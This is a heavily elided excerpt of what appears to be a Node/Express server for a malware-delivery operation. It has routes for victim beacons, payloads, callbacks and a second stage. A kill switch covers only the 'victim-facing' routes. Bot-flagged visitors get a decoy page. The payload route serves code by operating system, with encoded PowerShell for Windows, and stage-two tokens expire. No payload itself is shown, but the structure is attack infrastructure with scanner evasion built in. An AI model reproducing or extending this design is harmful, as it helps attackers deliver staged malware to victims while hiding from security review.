...
// Kill switch — ONLY on victim-facing routes (never the dashboard)
...
app.use(['/', '/api/beacon', '/api/payload', '/api/callback', '/stage2'], killSwitch);
...
app.get('/', (req, res) => {
    ...
    // Check if token is bot-flagged — serve decoy instead of real page
...
app.get('/api/payload', (req, res) => {
    ...
    if (os === 'mac' || os === 'Mac OS') {
        ...
        // Windows — primary PowerShell -enc, with fallbacks available via variant param
...
app.get('/stage2', (req, res) => {
    ...
    if (t.expires_at < Date.now()) return res.status(410).send('// Token expired');
